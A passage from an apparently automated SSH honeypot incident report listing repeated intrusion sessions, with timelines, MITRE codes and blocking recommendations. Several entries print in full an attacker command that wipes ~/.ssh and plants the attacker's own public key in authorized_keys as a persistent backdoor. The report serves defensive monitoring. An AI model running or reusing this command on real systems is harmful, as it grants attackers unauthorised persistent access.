| **First Seen** | 2026-04-19 13:59 |
| **Last Seen** | 2026-04-19 13:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:59:47` | `cowrie.session.connect` |
| `2026-04-19 13:59:47` | `cowrie.client.version` |
| `2026-04-19 13:59:48` | `cowrie.client.kex` |
| `2026-04-19 13:59:48` | `cowrie.login.success` |
| `2026-04-19 13:59:49` | `cowrie.session.params` |
| `2026-04-19 13:59:49` | `cowrie.command.input` |
| `2026-04-19 13:59:49` | `cowrie.command.failed` |
| `2026-04-19 13:59:49` | `cowrie.log.closed` |
| `2026-04-19 13:59:49` | `cowrie.session.params` |
| `2026-04-19 13:59:49` | `cowrie.command.input` |
| `2026-04-19 13:59:49` | `cowrie.session.file_download` |
| `2026-04-19 13:59:49` | `cowrie.log.closed` |
| `2026-04-19 13:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c54a1185c30

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 13:59 |
| **Last Seen** | 2026-04-19 13:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:59:51` | `cowrie.session.connect` |
| `2026-04-19 13:59:51` | `cowrie.client.version` |
| `2026-04-19 13:59:51` | `cowrie.client.kex` |
| `2026-04-19 13:59:52` | `cowrie.login.success` |
| `2026-04-19 13:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9282389c4759

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:00 |
| **Last Seen** | 2026-04-19 14:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:00:38` | `cowrie.session.connect` |
| `2026-04-19 14:00:38` | `cowrie.client.version` |
| `2026-04-19 14:00:38` | `cowrie.client.kex` |
| `2026-04-19 14:00:39` | `cowrie.login.success` |
| `2026-04-19 14:00:39` | `cowrie.session.params` |
| `2026-04-19 14:00:39` | `cowrie.command.input` |
| `2026-04-19 14:00:39` | `cowrie.command.failed` |
| `2026-04-19 14:00:39` | `cowrie.log.closed` |
| `2026-04-19 14:00:40` | `cowrie.session.params` |
| `2026-04-19 14:00:40` | `cowrie.command.input` |
| `2026-04-19 14:00:40` | `cowrie.session.file_download` |
| `2026-04-19 14:00:40` | `cowrie.log.closed` |
| `2026-04-19 14:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-940d5e02d21e

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 14:00 |
| **Last Seen** | 2026-04-19 14:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:00:42` | `cowrie.session.connect` |
| `2026-04-19 14:00:42` | `cowrie.client.version` |
| `2026-04-19 14:00:42` | `cowrie.client.kex` |
| `2026-04-19 14:00:42` | `cowrie.login.success` |
| `2026-04-19 14:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c16f4a512f

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:01 |
| **Last Seen** | 2026-04-19 14:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:01:21` | `cowrie.session.connect` |
| `2026-04-19 14:01:21` | `cowrie.client.version` |
| `2026-04-19 14:01:21` | `cowrie.client.kex` |
| `2026-04-19 14:01:22` | `cowrie.login.success` |
| `2026-04-19 14:01:23` | `cowrie.session.params` |
| `2026-04-19 14:01:23` | `cowrie.command.input` |
| `2026-04-19 14:01:23` | `cowrie.command.failed` |
| `2026-04-19 14:01:23` | `cowrie.log.closed` |
| `2026-04-19 14:01:24` | `cowrie.session.params` |
| `2026-04-19 14:01:24` | `cowrie.command.input` |
| `2026-04-19 14:01:24` | `cowrie.session.file_download` |
| `2026-04-19 14:01:24` | `cowrie.log.closed` |
| `2026-04-19 14:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-004f3b5dc945

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:01 |
| **Last Seen** | 2026-04-19 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:01:27` | `cowrie.session.connect` |
| `2026-04-19 14:01:27` | `cowrie.client.version` |
| `2026-04-19 14:01:27` | `cowrie.client.kex` |
| `2026-04-19 14:01:28` | `cowrie.login.success` |
| `2026-04-19 14:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69526b06a540

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:01 |
| **Last Seen** | 2026-04-19 14:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:01:47` | `cowrie.session.connect` |
| `2026-04-19 14:01:47` | `cowrie.client.version` |
| `2026-04-19 14:01:47` | `cowrie.client.kex` |
| `2026-04-19 14:01:48` | `cowrie.login.success` |
| `2026-04-19 14:01:49` | `cowrie.session.params` |
| `2026-04-19 14:01:49` | `cowrie.command.input` |
| `2026-04-19 14:01:49` | `cowrie.command.failed` |
| `2026-04-19 14:01:49` | `cowrie.log.closed` |
| `2026-04-19 14:01:50` | `cowrie.session.params` |
| `2026-04-19 14:01:50` | `cowrie.command.input` |
| `2026-04-19 14:01:50` | `cowrie.session.file_download` |
| `2026-04-19 14:01:50` | `cowrie.log.closed` |
| `2026-04-19 14:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3b9a57c462

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:01 |
| **Last Seen** | 2026-04-19 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:01:54` | `cowrie.session.connect` |
| `2026-04-19 14:01:54` | `cowrie.client.version` |
| `2026-04-19 14:01:54` | `cowrie.client.kex` |
| `2026-04-19 14:01:55` | `cowrie.login.success` |
| `2026-04-19 14:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377504c70a03

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:04 |
| **Last Seen** | 2026-04-19 14:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:04:59` | `cowrie.session.connect` |
| `2026-04-19 14:04:59` | `cowrie.client.version` |
| `2026-04-19 14:04:59` | `cowrie.client.kex` |
| `2026-04-19 14:05:00` | `cowrie.login.success` |
| `2026-04-19 14:05:01` | `cowrie.session.params` |
| `2026-04-19 14:05:01` | `cowrie.command.input` |
| `2026-04-19 14:05:01` | `cowrie.command.failed` |
| `2026-04-19 14:05:01` | `cowrie.log.closed` |
| `2026-04-19 14:05:02` | `cowrie.session.params` |
| `2026-04-19 14:05:02` | `cowrie.command.input` |
| `2026-04-19 14:05:02` | `cowrie.session.file_download` |
| `2026-04-19 14:05:02` | `cowrie.log.closed` |
| `2026-04-19 14:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a864a52a43

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:05 |
| **Last Seen** | 2026-04-19 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:05:06` | `cowrie.session.connect` |
| `2026-04-19 14:05:06` | `cowrie.client.version` |
| `2026-04-19 14:05:06` | `cowrie.client.kex` |
| `2026-04-19 14:05:07` | `cowrie.login.success` |
| `2026-04-19 14:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.141.71[.]166` to AbuseIPDB if not already reported
- [ ] Block `187.141.71[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed62c927be3a

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:05 |
| **Last Seen** | 2026-04-19 14:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:05:14` | `cowrie.session.connect` |
| `2026-04-19 14:05:14` | `cowrie.client.version` |
| `2026-04-19 14:05:14` | `cowrie.client.kex` |
| `2026-04-19 14:05:14` | `cowrie.login.success` |
| `2026-04-19 14:05:15` | `cowrie.session.params` |
| `2026-04-19 14:05:15` | `cowrie.command.input` |
| `2026-04-19 14:05:15` | `cowrie.command.failed` |
| `2026-04-19 14:05:15` | `cowrie.log.closed` |
| `2026-04-19 14:05:15` | `cowrie.session.params` |
| `2026-04-19 14:05:15` | `cowrie.command.input` |
| `2026-04-19 14:05:15` | `cowrie.session.file_download` |
| `2026-04-19 14:05:15` | `cowrie.log.closed` |
| `2026-04-19 14:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7329ab8969f1

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 14:05 |
| **Last Seen** | 2026-04-19 14:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:05:18` | `cowrie.session.connect` |
| `2026-04-19 14:05:18` | `cowrie.client.version` |
| `2026-04-19 14:05:18` | `cowrie.client.kex` |
| `2026-04-19 14:05:18` | `cowrie.login.success` |
| `2026-04-19 14:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e52067bc56b9

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:06 |
| **Last Seen** | 2026-04-19 14:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:06:33` | `cowrie.session.connect` |
| `2026-04-19 14:06:33` | `cowrie.client.version` |
| `2026-04-19 14:06:33` | `cowrie.client.kex` |
| `2026-04-19 14:06:34` | `cowrie.login.success` |
| `2026-04-19 14:06:34` | `cowrie.session.params` |
| `2026-04-19 14:06:34` | `cowrie.command.input` |
| `2026-04-19 14:06:34` | `cowrie.command.failed` |
| `2026-04-19 14:06:34` | `cowrie.log.closed` |
| `2026-04-19 14:06:35` | `cowrie.session.params` |
| `2026-04-19 14:06:35` | `cowrie.command.input` |
| `2026-04-19 14:06:35` | `cowrie.session.file_download` |
| `2026-04-19 14:06:35` | `cowrie.log.closed` |
| `2026-04-19 14:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d018cc45a3e

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 14:06 |
| **Last Seen** | 2026-04-19 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:06:38` | `cowrie.session.connect` |
| `2026-04-19 14:06:38` | `cowrie.client.version` |
| `2026-04-19 14:06:38` | `cowrie.client.kex` |
| `2026-04-19 14:06:39` | `cowrie.login.success` |
| `2026-04-19 14:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daec963ab40a

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:07 |
| **Last Seen** | 2026-04-19 14:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:07:37` | `cowrie.session.connect` |
| `2026-04-19 14:07:37` | `cowrie.client.version` |
| `2026-04-19 14:07:37` | `cowrie.client.kex` |
| `2026-04-19 14:07:37` | `cowrie.login.success` |
| `2026-04-19 14:07:38` | `cowrie.session.params` |
| `2026-04-19 14:07:38` | `cowrie.command.input` |
| `2026-04-19 14:07:38` | `cowrie.command.failed` |
| `2026-04-19 14:07:38` | `cowrie.log.closed` |
| `2026-04-19 14:07:38` | `cowrie.session.params` |
| `2026-04-19 14:07:38` | `cowrie.command.input` |
| `2026-04-19 14:07:38` | `cowrie.session.file_download` |
| `2026-04-19 14:07:38` | `cowrie.log.closed` |
| `2026-04-19 14:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e938976cfc0

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]33` |
| **First Seen** | 2026-04-19 14:07 |
| **Last Seen** | 2026-04-19 14:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:07:40` | `cowrie.session.connect` |
| `2026-04-19 14:07:40` | `cowrie.client.version` |
| `2026-04-19 14:07:40` | `cowrie.client.kex` |
| `2026-04-19 14:07:40` | `cowrie.login.success` |
| `2026-04-19 14:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4444b51c3061

| Field | Detail |
|---|---|
| **Source IP** | `187.141.71[.]166` |
| **First Seen** | 2026-04-19 14:08 |
| **Last Seen** | 2026-04-19 14:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 14:08:08` | `cowrie.session.connect` |
| `2026-04-19 14:08:08` | `cowrie.client.version` |
| `2026-04-19 14:08:08` | `cowrie.client.kex` |
